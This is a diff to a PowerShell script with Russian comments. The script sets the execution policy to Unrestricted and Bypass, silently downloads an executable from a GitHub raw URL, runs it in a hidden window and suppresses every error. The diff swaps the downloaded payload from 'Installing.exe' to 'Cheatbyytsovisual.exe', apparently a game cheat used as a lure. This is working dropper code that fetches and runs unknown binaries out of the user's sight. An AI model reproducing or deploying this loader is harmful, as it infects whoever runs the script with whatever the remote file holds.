@@ -12,10 +12,10 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
     # Запускаем 
     Start-Process -FilePath "Installing.exe" -WindowStyle Hidden
 
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Installing.exe" -OutFile "Installing.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Cheatbyytsovisual.exe" -OutFile "Cheatbyytsovisual.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "Installing.exe" -WindowStyle Hidden
+    Start-Process -FilePath "Cheatbyytsovisual.exe" -WindowStyle Hidden
     
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -111,6 +111,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
